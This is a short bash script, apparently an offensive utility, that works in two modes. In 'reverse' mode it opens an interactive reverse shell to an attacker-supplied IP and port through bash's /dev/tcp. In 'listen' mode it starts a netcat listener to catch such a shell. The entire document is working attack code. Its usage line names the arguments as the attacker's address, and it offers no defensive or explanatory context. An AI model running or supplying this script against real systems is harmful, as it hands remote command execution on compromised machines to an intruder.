#!/bin/bash
# reverse_vs_listener.sh - Dual-mode script: act as reverse shell or listener.
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <mode: reverse|listen> <attacker_ip> <attacker_port>"
  exit 1
fi

if [ "$1" = "reverse" ]; then
  echo "Launching reverse shell to $2:$3..."
  bash -i >& /dev/tcp/$2/$3 0>&1
elif [ "$1" = "listen" ]; then
  echo "Starting listener on port $3..."
  nc -lvnp "$3"
else
  echo "Invalid mode. Use 'reverse' or 'listen'."
fi
